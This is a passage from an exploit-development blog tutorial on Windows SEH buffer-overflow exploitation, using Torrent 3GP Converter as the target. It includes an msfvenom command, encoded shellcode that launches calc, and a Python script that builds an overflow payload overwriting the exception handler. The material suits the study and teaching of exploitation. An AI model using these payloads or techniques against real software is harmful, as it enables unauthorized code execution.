<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Clearing up Windows SEH exploitation" /><meta name="author" content="RAC" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://richard-ac.github.io/posts/SEH/" /><meta property="og:url" content="https://richard-ac.github.io/posts/SEH/" /><meta property="og:site_name" content="RAC Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-06T19:33:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Clearing up Windows SEH exploitation" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@RAC" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"RAC"},"description":"Introduction","url":"https://richard-ac.github.io/posts/SEH/","@type":"BlogPosting","headline":"Clearing up Windows SEH exploitation","dateModified":"2021-09-18T09:23:10+08:00","datePublished":"2021-01-06T19:33:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://richard-ac.github.io/posts/SEH/"},"@context":"https://schema.org"}</script><title>Clearing up Windows SEH exploitation | RAC Blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script> <script defer src="/app.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-9VRMP80RNQ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-9VRMP80RNQ'); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/RAC.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">RAC Blog</a></div><div class="site-subtitle font-italic">Exploit Development, Vulnerability Research and Systems Programming</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/disclosures/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>DISCLOSURES</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Richard-AC" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xrac','protonmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Clearing up Windows SEH exploitation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Clearing up Windows SEH exploitation</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 6, 2021, 7:33 PM +0800" > Jan 6, 2021 <i class="unloaded">2021-01-06T19:33:00+08:00</i> </span> by <span class="author"> RAC </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 18, 2021, 1:23 AM +0000" > Sep 18, 2021 <i class="unloaded">2021-09-18T09:23:10+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2565 words">14 min</span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><hr /><p>SEH is an exception handling mechanism used in Windows programs which has been abused by exploit writers for years. <a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/">This Corelan article</a> gives a good introduction to SEH and presents the “POP/POP/RET” exploitation technique. However, there is still a lot of confusion as to why such a technique is necessary. Searching for “the need for POP/POP/RET in SEH exploits” on Google did not clear things up but only lead to more confusion.</p><p>Unsatisfied with the results, I decided to dig into windows internals myself and here are the results.</p><p>To illustrate we will write an exploit for <em>Torrent 3GP Converter</em>, a video conversion program. A vulnerable version of the program is available <a href="https://www.exploit-db.com/exploits/47965">here</a> if you want to follow along. Credit goes to <a href="https://boku7.github.io/">boku</a> for the original exploit.</p><p>In this post we will :</p><ol><li>Write an initial exploit where we directly overwrite the exception handler wih the address of our shellcode<li>Dig into the Win32 exception handling internals to understand why our first exploit failed<li>Write a working exploit using the POP/POP/RET technique</ol><h2 id="seh-refresher">SEH refresher</h2><hr /><p>Structued Exception Handling (SEH) is how Windows implements the <a href="https://docs.microsoft.com/en-us/cpp/cpp/try-except-statement?view=msvc-160">try-except statement</a> :</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>    <span class="c1">// . . .</span>
    <span class="kr">__try</span> <span class="p">{</span>
        <span class="c1">// guarded code</span>
    <span class="p">}</span>
    <span class="kr">__except</span> <span class="p">(</span> <span class="cm">/* filter expression */</span> <span class="p">)</span> <span class="p">{</span>
        <span class="c1">// termination code</span>
    <span class="p">}</span>
    <span class="c1">// . . .</span>
</pre></table></code></div></div><p>To do so, in Win32, <em>Exception Registration Record</em> are placed on the stack. Each one has two entries :</p><ul><li>A pointer to the code that will try to handle the exception<li>A pointer to the next <em>Exception Registration Record</em>, thus creating a linked list of Records on the stack</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/seh.png" alt="SEH" /> <em>Simple view of the SEH chain on the stack</em></p><p>When an exception occurs, the OS traverses the list trying to find a suitable handler.</p><p>If an attacker can overwrite, a pointer to a handler and then cause an exception, he might be able to get control of the program.</p><p>As it is not the focus of this article, let’s get through the generic exploitation process quickly and move on to SEH internals. I recommend reading the above-mentionned <a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/">Corelan post</a> for more details.</p><h2 id="exploit-writing">Exploit writing</h2><hr /><p>This video converter suffers from a buffer overflow in the “Code” field of the “Registration” option.</p><p>Let’s attach a debugger and feed 5000 “A” characters into this field. I’ll be using <em>Immunity Debugger</em>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/A_overflow.png" alt="Bug" /> <em>Triggering the bug</em></p><p>Looking through the stack we notice that our input has overwritten an Exception Registration Record. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/registration_record_A.png" alt="" /> <em>Overwritting an Exception Registration Record with “A”</em></p><p>Thanks to some trial and error we can figure out that 4500 characters are needed before reaching the exception registration record. Let’s verify this by sending 4500 “A” characters followed by “BBBB” and “CCCC”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/registration_record_offset.png" alt="" /> <em>“BBBB” and “CCCC” end up overwritting the two fields of the exception registration record, thus confirming our offset calculation</em></p><p>Now that we control an Exception Registration Record and can trigger an exception, getting code execution should be pretty straightforward.</p><p>Let’s use the <a href="https://github.com/corelan/mona">mona debugger plugin</a> to help us in the exploitation.</p><p>Using the <code class="language-plaintext highlighter-rouge">!mona modules</code> command, we can learn about the protections used by the modules loaded in the address space.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/mona_modules_non_os_dll.png" alt="" /> <em>Output of the !mona modules command (not showing OS DLLs)</em></p><p>We notice a few points that make the exploitation easier :</p><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention">Data Execution Prevention</a> is disabled so we can execute code directly on the stack.<li>There is plenty of non-ASLR modules in the address space, including the main executable.<li>There is multiple non-SafeSEH modules (we’ll come back to this).<li>Only Windows servers have SEHOP enabled by default so we won’t have to deal with it here.</ul><h2 id="badchars">Badchars</h2><hr /><p>(You can skip this part if you only care about SEH)</p><p>The main difficulty in this exploit is the available character set. Indeed we can only send alphanumeric uppercase characters as well as a few special characters. Msfvenom is unable to generate a shellcode fully compliant with those constraints because the GetEIP procedure that it uses involves non-alphanumeric characters. To solve this problem, one may store the address of the shellcode in a controlled register and tell msfvenom not to generate the GetEIP part of the shellcode as explained <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>. In our case we will have just <code class="language-plaintext highlighter-rouge">ret</code> to our shellcode so ESP - 4 will point to the beginning of our shellcode allowing us to craft an easy alphanumeric GetEIP code.</p><p>This is the shellcode we will be using. It’s coming straight from <code class="language-plaintext highlighter-rouge">msfvenom -a x86 --platform windows -p windows/exec CMD='calc' -e x86/alpha_upper --format python -v shellcode BufferRegister=ECX -f python</code> with an alphanumeric uppercase GetEIP code appended at the beginning that stores the current instruction pointer into ECX.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c</span><span class="s">"</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># dec esp * 4
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x59</span><span class="s">"</span> <span class="c1"># pop ecx
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x83\xC1\x08</span><span class="s">"</span> <span class="c1"># add ecx, 0x8
# Now ECX points to our shellcode
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4a\x4a\x49\x4b\x4c\x4b\x58\x4c\x42\x33\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x33\x30\x33\x30\x55\x30\x4b\x39\x5a\x45\x46</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x49\x50\x42\x44\x4c\x4b\x36\x30\x50\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x4b\x50\x52\x44\x4c\x4c\x4b\x51\x42\x35</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x44\x4c\x4b\x32\x52\x47\x58\x44\x4f\x48\x37</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x50\x4a\x37\x56\x36\x51\x4b\x4f\x4e\x4c\x47</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x45\x31\x53\x4c\x34\x42\x46\x4c\x57\x50</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x49\x51\x38\x4f\x44\x4d\x53\x31\x48\x47\x4b</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x52\x5a\x52\x31\x42\x31\x47\x4c\x4b\x56\x32</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x52\x30\x4c\x4b\x30\x4a\x37\x4c\x4c\x4b\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x42\x31\x33\x48\x4a\x43\x57\x38\x45\x51</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x38\x51\x30\x51\x4c\x4b\x51\x49\x57\x50\x35</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x48\x53\x4c\x4b\x47\x39\x42\x38\x5a\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x37\x4a\x47\x39\x4c\x4b\x36\x54\x4c\x4b\x55</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x48\x56\x50\x31\x4b\x4f\x4e\x4c\x4f\x31</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x38\x4f\x54\x4d\x45\x51\x49\x57\x36\x58\x4d</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x30\x34\x35\x4c\x36\x54\x43\x43\x4d\x4a\x58</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x37\x4b\x33\x4d\x37\x54\x53\x45\x5a\x44\x56</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x38\x4c\x4b\x31\x48\x37\x54\x53\x31\x59\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x32\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x58\x35\x4c\x43\x31\x39\x43\x4c\x4b\x53\x34</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x4b\x43\x31\x58\x50\x4b\x39\x30\x44\x57</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x54\x51\x34\x31\x4b\x51\x4b\x35\x31\x51\x49</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\x4a\x56\x31\x4b\x4f\x4b\x50\x51\x4f\x51</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4f\x50\x5a\x4c\x4b\x44\x52\x5a\x4b\x4c\x4d</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\x4d\x53\x5a\x55\x51\x4c\x4d\x4d\x55\x58</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x32\x55\x50\x35\x50\x43\x30\x56\x30\x43\x58</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x36\x51\x4c\x4b\x42\x4f\x4d\x57\x4b\x4f\x48</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x55\x4f\x4b\x4c\x30\x4e\x55\x39\x32\x46\x36</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x53\x58\x49\x36\x4d\x45\x4f\x4d\x4d\x4d\x4b</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4f\x49\x45\x47\x4c\x43\x36\x33\x4c\x54\x4a</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4b\x30\x4b\x4b\x4d\x30\x53\x45\x43\x35\x4f</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4b\x57\x37\x54\x53\x54\x32\x32\x4f\x53\x5a</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x35\x50\x36\x33\x4b\x4f\x4e\x35\x42\x43\x33</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x32\x4c\x53\x53\x35\x50\x41\x41</span><span class="s">"</span>
</pre></table></code></div></div><h2 id="safeseh">SafeSEH</h2><hr /><p>As explained in <a href="http://uninformed.org/index.cgi?v=9&amp;a=4&amp;p=7">this <em>Uninformed</em> article</a>, SafeSEH is a security mechanism introduced with <em>Visual Studio 2003</em>. It works by adding a static list of known good exception handlers in the PE file at compile time. Before executing and exception handler, it is checked against the table. Execution is passed to the handler only if it matches an entry in the table.</p><p><em>SafeSEH</em> only exists in 32 bit applications because 64 bit exception handler are not stored on the stack.</p><p>Most articles I have read mention “bypassing <a href="https://docs.microsoft.com/en-US/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=msvc-160"><strong>SafeSEH</strong></a>” as the reason for using the POP/POP/RET technique.</p><p>In our case, most of the loaded modules, including the main executable where the exception is triggered, are not compiled with the <em>/SAFESEH</em> flag. Therefore, one might think that the “<em>SafeSEH</em> bypass” is not needed here.</p><p>Let’s try pointing the exception handler directly to our shellcode and see what happens.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="s">"..."</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"E"</span><span class="o">*</span><span class="mi">20</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># Padding used so the shellcode address doesn't contain badchars
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">4500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"BBBB"</span> <span class="c1">#nSEH
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x48\xD2\x19</span><span class="s">"</span> <span class="c1">#SEH (our shellcode is at 0x0019D248)
</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"buf.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">inp</span><span class="p">:</span>
    <span class="n">inp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/registration_record_shellcode.png" alt="" /> <em>View of the stack after the overflow. The exception handler now points to our shellcode</em></p><p>Everything is lined up correctly but unfortunately, our handler ends up not being used. To understand why, we will inspect the exception handling process more closely.</p><p>From now on I will be using WinDbg which has the advantage of automatically downloading symbols for Windows default binaries from the <em>Microsoft Symbol Server</em>.</p><p>Let’s attach WinDbg and cause the exception. You can view the current exception chain using the <code class="language-plaintext highlighter-rouge">!exchain</code> command.</p><p>First of all we want to figure out what Windows functions are involved in the exception handling process. To do so, we setup a breakpoint to trigger whenever 0x0019d104, which is the address of the first record in the chain, is read.</p><p><code class="language-plaintext highlighter-rouge">ba r 4 0019d104</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/windbg1.png" alt="" /> <em>!exchain shows the corrupted SEH chain. After that, our breakpoint gets hit</em></p><p>Looking at the stack trace, we discover what functions are involved in the exception handling process. Understanding them will probably answer all of our questions.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/windbg2.png" alt="" /> <em>Stack trace when the address of the first Exception Registration Record is read</em></p><h2 id="seh-internals">SEH internals</h2><hr /><p><a href="https://en.wikipedia.org/wiki/Ntoskrnl.exe">This Wikipedia article</a> gives an explaination of different prefixes used by Windows NT functions. Here are the ones that matter to us :</p><dl><dt>Ki (Kernel Internal)<dd>Functions used by the kernel to invoke certain functionality on the behalf of user mode.<dt>Rtl (Runtime Library)<dd>Utility functions that can be used by native applications, yet don’t directly involve kernel support.<dt>Rtlp (Private Runtime Libraries)<dd>Run-Time Library internal routines that are not exported from the kernel.</dl><p>According to the previous stack trace, the first function being called in the exception dispatching process is 